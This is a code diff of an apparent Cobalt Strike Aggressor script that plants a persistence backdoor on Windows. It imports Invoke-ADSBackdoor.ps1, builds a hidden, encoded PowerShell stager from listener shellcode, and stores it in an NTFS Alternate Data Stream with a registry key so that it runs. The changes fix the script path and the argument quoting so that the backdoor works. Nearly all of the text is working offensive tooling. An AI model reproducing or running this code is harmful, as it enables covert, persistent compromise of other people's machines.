@@ -13,14 +13,16 @@ sub servicefilename {
 sub createADSBackdoor {
 	$bid = $1;
 	$selectedListener = $2;
-	prompt_text("Location of file/folder to give ADS (it must exist!)?", "%APPDATA%\Temp\somefile.txt", lambda({
+	getADSRegName();
+	bpowershell_import($bid, script_resource("scripts/Invoke-ADSBackdoor.ps1"));
+	prompt_text("Location of file/folder to give ADS (it must exist!)?", "%APPDATA%\Temp\somefile.txt", {
 		# Encode shellcode for the stager
 		$psPayload = powershell_encode_stager(shellcode($selectedListener));
-		$fullPsPayload = "powershell.exe -nop -w hidden -encodedcommand $psPayload";
-		bpowershell_import($bid, script_resource("scritps\Invoke-ADSBackdoor.ps1"));
-		getADSRegName();
-		bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName $theADSRegName -backdoored_file_path $1 -cobaltstrike_gen_payload $fullPsPayload");
-	} $bid => $1, $selectedListener => $2 ));
+		$fullPsPayload = "powershell.exe -nop -w hidden -encodedcommand $psPayload ";
+		binput($bid, "powershell-import Invoke-ADSBackdoor.ps1");
+		binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName $theADSRegName -backdoored_file_path $1 -cobaltstrike_gen_payload");
+		bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName $theADSRegName -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
+	});
 }
 
 # Returns a string to use for the reg key name
